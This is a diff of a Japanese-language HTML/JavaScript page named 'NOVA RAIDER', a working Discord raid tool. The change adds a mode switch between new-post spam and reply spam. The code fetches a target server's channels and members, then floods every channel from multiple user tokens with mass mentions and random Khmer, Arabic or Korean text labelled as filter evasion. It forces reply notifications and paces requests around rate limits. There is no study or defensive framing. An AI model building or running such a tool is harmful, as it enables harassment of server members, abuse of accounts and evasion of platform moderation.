@@ -2,39 +2,33 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>NOVA RAIDER V6 - Legacy Sweep</title>
+    <title>NOVA RAIDER V2.0 </title>
     <style>
         :root {
-            --bg: #08080c;
+            --bg: #040406;
             --accent: #00d4ff;
             --danger: #ff0055;
-            --card: #11111d;
-            --border: #1f1f35;
+            --card: #0a0a12;
+            --border: #1a1a2e;
+            --success: #00ff88;
         }
 
         body {
             font-family: 'Consolas', 'Meiryo', sans-serif;
             background-color: var(--bg);
-            color: #ccc;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
+            color: #d1d1d6;
+            margin: 0; padding: 20px; display: flex; justify-content: center;
         }
 
         .container {
-            width: 100%;
-            max-width: 800px;
-            background: var(--card);
-            padding: 25px;
-            border-radius: 8px;
-            border: 1px solid var(--border);
-            box-shadow: 0 0 50px rgba(0,0,0,0.8);
+            width: 100%; max-width: 850px; background: var(--card); padding: 25px;
+            border-radius: 8px; border: 1px solid var(--border);
+            box-shadow: 0 0 40px rgba(0, 212, 255, 0.1);
         }
 
-        .title { text-align: center; color: var(--accent); font-size: 24px; letter-spacing: 5px; margin-bottom: 20px; text-shadow: 0 0 10px var(--accent); }
+        .title-area { text-align: center; margin-bottom: 20px; border-bottom: 1px solid var(--border); padding-bottom: 15px; }
+        .title { font-size: 26px; font-weight: 900; letter-spacing: 10px; color: var(--accent); margin: 0; }
 
-        .form-section { margin-bottom: 15px; }
         label { display: block; font-size: 11px; color: var(--accent); margin-bottom: 5px; font-weight: bold; }
 
         textarea, input, select {
@@ -42,29 +36,39 @@
             border-radius: 4px; color: #fff; box-sizing: border-box; font-size: 12px; outline: none;
         }
 
-        .flex-row { display: flex; gap: 10px; margin-bottom: 15px; }
+        .flex-row { display: flex; gap: 12px; margin-bottom: 12px; }
         .flex-1 { flex: 1; }
 
-        .btn { width: 100%; padding: 12px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 5px; }
-        .btn-main { background: var(--accent); color: #000; }
-        .btn-stop { background: var(--danger); color: #fff; margin-top: 10px; }
-        .btn-util { background: #1a1a2a; color: var(--accent); border: 1px solid var(--accent); font-size: 11px; }
-
-        #log {
-            margin-top: 20px; height: 180px; background: #000; border: 1px solid var(--border);
-            padding: 10px; font-size: 11px; overflow-y: auto; color: #999;
+        .btn { padding: 12px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 13px; }
+        .btn-main { background: var(--accent); color: #000; width: 100%; }
+        .btn-stop { background: var(--danger); color: #fff; width: 100px; }
+        
+        /* モード切替パネル */
+        .mode-panel {
+            background: #000; padding: 15px; border-radius: 6px; border: 1px solid var(--border);
+            display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px;
         }
-        .log-hit { color: var(--accent); }
+        .mode-btn { background: #1a1a2a; color: #555; border: 1px solid #333; padding: 10px 20px; border-radius: 4px; flex: 1; text-align: center; margin: 0 5px; cursor: pointer; font-size: 12px; }
+        .mode-btn.active { border-color: var(--accent); color: var(--accent); background: rgba(0, 212, 255, 0.1); font-weight: bold; box-shadow: 0 0 10px rgba(0, 212, 255, 0.2); }
+
+        .status-bar {
+            display: flex; justify-content: space-around; background: #000; padding: 10px;
+            border-radius: 4px; margin-bottom: 15px; border: 1px inset var(--border);
+        }
+        .status-val { color: var(--accent); font-weight: bold; }
+
+        #log { margin-top: 15px; height: 180px; background: #000; border: 1px solid var(--border); padding: 10px; font-size: 11px; overflow-y: auto; color: #777; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="title">NOVA RAIDER V6</div>
-    <p style="text-align:center; font-size:10px; margin-top:-15px; opacity:0.7;">EXISTING MESSAGE SWEEP SYSTEM</p>
+    <div class="title-area">
+        <h1 class="title">NOVA RAIDER V9</h1>
+    </div>
 
-    <div class="form-section">
-        <label>使用トークン (1行1つ)</label>
+    <div class="form-section" style="margin-bottom: 12px;">
+        <label>使用トークン (1行1枚)</label>
         <textarea id="tokens" style="height: 50px;"></textarea>
     </div>
 
@@ -72,138 +76,174 @@
         <div class="flex-1">
             <label>ターゲットサーバーID</label>
             <input type="text" id="guildId">
-            <button class="btn-util" onclick="setupServer()">チャンネルリスト取得</button>
+            <button class="btn" style="background:#1a1a2a; color:var(--accent); font-size:10px; margin-top:5px; padding:5px;" onclick="fetchData()">データ同期</button>
         </div>
-        <div class="flex-1">
-            <label>遡り件数 (1チャンネルにつき何件にリプライするか)</label>
-            <input type="number" id="limitPerCh" value="50">
+        <div style="width: 120px;">
+            <label>遡り件数 / Ch</label>
+            <input type="number" id="limit" value="30">
         </div>
     </div>
 
     <div class="flex-row">
+        <textarea class="flex-1" id="channels" style="height: 60px;" placeholder="チャンネルID"></textarea>
+        <textarea class="flex-1" id="members" style="height: 60px;" placeholder="メンバーID"></textarea>
+    </div>
+
+    <label>攻撃モード選択</label>
+    <div class="mode-panel">
+        <div id="modeNormal" class="mode-btn active" onclick="setMode('normal')">通常爆撃 (新規投稿)</div>
+        <div id="modeReply" class="mode-btn" onclick="setMode('reply')">リプライ爆撃 (既存返信)</div>
+    </div>
+
+    <div class="flex-row" style="align-items: flex-end;">
         <div class="flex-1">
-            <label>ターゲットチャンネルID</label>
-            <textarea id="channels" style="height: 80px;"></textarea>
-        </div>
-        <div class="flex-1">
-            <label>メンション対象ID</label>
-            <textarea id="members" style="height: 80px;"></textarea>
+            <label>本文 / 回避言語 / メンション数</label>
+            <div style="display: flex; gap: 5px;">
+                <input type="text" id="msgBody" value="RAID SYSTEM ONLINE">
+                <select id="lang" style="width: 100px;">
+                    <option value="km">クメール語</option>
+                    <option value="ar">アラビア語</option>
+                    <option value="ko">韓国語</option>
+                </select>
+                <input type="number" id="mCount" value="3" style="width: 50px;">
+            </div>
         </div>
     </div>
 
-    <div class="flex-row" style="background: rgba(0,212,255,0.05); padding: 10px; border-radius: 4px;">
-        <div class="flex-1">
-            <label>本文</label>
-            <input type="text" id="msgBody" value="REPLY SWEEP ATTACHED">
-        </div>
-        <div style="width: 80px;">
-            <label>言語</label>
-            <select id="lang">
-                <option value="km">クメール語</option>
-                <option value="ar">アラビア語</option>
-                <option value="ko">韓国語</option>
-            </select>
-        </div>
-        <div style="width: 60px;">
-            <label>文字数</label>
-            <input type="number" id="strLen" value="15">
-        </div>
+    <div class="status-bar">
+        <div>MODE: <span id="currentModeDisplay" class="status-val">NORMAL</span></div>
+        <div>SENT: <span id="sentCount" class="status-val">0</span></div>
+        <div>STATUS: <span id="statusText" class="status-val" style="color:var(--success)">READY</span></div>
     </div>
 
-    <button id="start" class="btn btn-main" onclick="startSweep()">全既存メッセージへのリプライ開始</button>
-    <button id="stop" class="btn btn-stop" onclick="stopSweep()" disabled>停止</button>
+    <div class="flex-row">
+        <button id="start" class="btn btn-main flex-1" onclick="execute()">RAID 起動</button>
+        <button id="stop" class="btn btn-stop" onclick="stop()" disabled>停止</button>
+    </div>
 
     <div id="log"></div>
 </div>
 
 <script>
     let sweeping = false;
+    let attackMode = 'normal'; // 'normal' or 'reply'
+    let sentCount = 0;
     const charSets = { km: "កខគឃងចឆជឈញដឋឌឍណតថទធនបផពភមយរលវសហឡអ", ar: "ابتثجحخدذرزسشصضطظعغفقكلمنهوي", ko: "가나다라마바사아자차카타파하" };
 
-    function log(m, c="") {
+    function log(m) {
         const l = document.getElementById('log');
         const d = document.createElement('div');
-        if(c) d.style.color = c;
         d.innerHTML = `[${new Date().toLocaleTimeString()}] ${m}`;
         l.prepend(d);
     }
 
-    async function setupServer() {
+    // モード切り替え
+    function setMode(mode) {
+        attackMode = mode;
+        document.getElementById('modeNormal').classList.toggle('active', mode === 'normal');
+        document.getElementById('modeReply').classList.toggle('active', mode === 'reply');
+        document.getElementById('currentModeDisplay').innerText = mode.toUpperCase();
+        log(`攻撃モードを ${mode.toUpperCase()} に変更しました。`);
+    }
+
+    async function fetchData() {
         const t = document.getElementById('tokens').value.split('\n')[0].trim();
         const g = document.getElementById('guildId').value.trim();
-        if(!t || !g) return alert("トークンとサーバーIDが必要です");
+        if(!t || !g) return alert("入力不足");
         try {
-            const r = await fetch(`https://discord.com/api/v9/guilds/${g}/channels`, { headers: { 'Authorization': t } });
-            const data = await r.json();
-            document.getElementById('channels').value = data.filter(c => [0,5].includes(c.type)).map(c => c.id).join('\n');
+            const rC = await fetch(`https://discord.com/api/v9/guilds/${g}/channels`, { headers: { 'Authorization': t } });
+            const channels = await rC.json();
+            document.getElementById('channels').value = channels.filter(c => [0,5].includes(c.type)).map(c => c.id).join('\n');
             const rM = await fetch(`https://discord.com/api/v9/guilds/${g}/members?limit=1000`, { headers: { 'Authorization': t } });
-            const mData = await rM.json();
-            document.getElementById('members').value = mData.map(m => m.user.id).join('\n');
-            log("サーバーデータ同期完了", "var(--accent)");
-        } catch(e) { log("取得失敗", "var(--danger)"); }
+            const members = await rM.json();
+            document.getElementById('members').value = members.map(m => m.user.id).join('\n');
+            log("同期完了。ターゲットチャンネルとメンバーを抽出しました。");
+        } catch(e) { log("データ取得に失敗しました。"); }
     }
 
     function getRand() {
         const s = charSets[document.getElementById('lang').value];
         let r = "";
-        for(let i=0; i<parseInt(document.getElementById('strLen').value); i++) r += s.charAt(Math.floor(Math.random()*s.length));
+        for(let i=0; i<15; i++) r += s.charAt(Math.floor(Math.random()*s.length));
         return r;
     }
 
-    async function startSweep() {
+    async function execute() {
         sweeping = true;
         document.getElementById('start').disabled = true;
         document.getElementById('stop').disabled = false;
+        document.getElementById('statusText').innerText = "RUNNING";
         
         const tokens = document.getElementById('tokens').value.split('\n').filter(x => x.trim());
         const channels = document.getElementById('channels').value.split('\n').filter(x => x.trim());
         const members = document.getElementById('members').value.split('\n').filter(x => x.trim());
-        const limit = parseInt(document.getElementById('limitPerCh').value);
+        const limit = parseInt(document.getElementById('limit').value);
 
-        log("全メッセージ遡及リプライを開始します...", "yellow");
+        log(`攻撃開始: モード = ${attackMode.toUpperCase()}`);
 
         for (const chId of channels) {
             if (!sweeping) break;
-            log(`チャンネル: ${chId} の過去ログをスキャン中...`);
 
-            try {
-                // 過去ログを取得
-                const res = await fetch(`https://discord.com/api/v9/channels/${chId}/messages?limit=${limit}`, {
-                    headers: { 'Authorization': tokens[0] }
-                });
-                const messages = await res.json();
-
-                if (Array.isArray(messages)) {
-                    for (const msg of messages) {
-                        if (!sweeping) break;
-                        
-                        // リプライ送信
-                        const t = tokens[Math.floor(Math.random() * tokens.length)];
-                        const mentions = members.sort(() => 0.5 - Math.random()).slice(0, 3).map(id => `<@${id}>`).join(" ");
-                        
-                        await fetch(`https://discord.com/api/v9/channels/${chId}/messages`, {
-                            method: 'POST',
-                            headers: { 'Authorization': t, 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                content: `${mentions} ${document.getElementById('msgBody').value}\n# ${getRand()}`,
-                                message_reference: { message_id: msg.id }
-                            })
-                        });
-                        log(`完了: MessageID(${msg.id}) へのリプライ`, "var(--accent)");
-                        await new Promise(r => setTimeout(r, 1000)); // レート制限回避用ディレイ
+            if (attackMode === 'reply') {
+                // リプライモード：既存メッセージを取得して返信
+                try {
+                    const res = await fetch(`https://discord.com/api/v9/channels/${chId}/messages?limit=${limit}`, {
+                        headers: { 'Authorization': tokens[0] }
+                    });
+                    const messages = await res.json();
+                    if (Array.isArray(messages)) {
+                        for (const msg of messages) {
+                            if (!sweeping) break;
+                            await sendAction(tokens, chId, msg.id, members);
+                            await new Promise(r => setTimeout(r, 800));
+                        }
                     }
+                } catch (e) {}
+            } else {
+                // 通常モード：単なる新規投稿（指定件数分ループ）
+                for (let i = 0; i < limit; i++) {
+                    if (!sweeping) break;
+                    await sendAction(tokens, chId, null, members);
+                    await new Promise(r => setTimeout(r, 800));
                 }
-            } catch (e) { log(`エラー: ${chId} の処理に失敗`, "var(--danger)"); }
+            }
         }
-        log("すべての遡及リプライ処理が終了しました。", "var(--accent)");
-        stopSweep();
+        stop();
     }
 
-    function stopSweep() {
+    async function sendAction(tokens, chId, replyId, members) {
+        const token = tokens[Math.floor(Math.random() * tokens.length)];
+        const mCount = parseInt(document.getElementById('mCount').value);
+        let mentions = members.sort(() => 0.5 - Math.random()).slice(0, mCount).map(id => `<@${id}>`).join(" ");
+        
+        const payload = {
+            content: `${mentions} ${document.getElementById('msgBody').value}\n# ${getRand()}`
+        };
+
+        if (replyId) {
+            payload.message_reference = { message_id: replyId };
+            payload.allowed_mentions = { replied_user: true }; // 通知ありリプライ
+        }
+
+        try {
+            const res = await fetch(`https://discord.com/api/v9/channels/${chId}/messages`, {
+                method: 'POST',
+                headers: { 'Authorization': token, 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            if (res.ok) {
+                sentCount++;
+                document.getElementById('sentCount').innerText = sentCount;
+            }
+        } catch (e) {}
+    }
+
+    function stop() {
         sweeping = false;
         document.getElementById('start').disabled = false;
         document.getElementById('stop').disabled = true;
-        log("プロセスを停止しました。");
+        document.getElementById('statusText').innerText = "STOPPED";
+        log("プロセス停止。");
     }
 </script>
 </body>
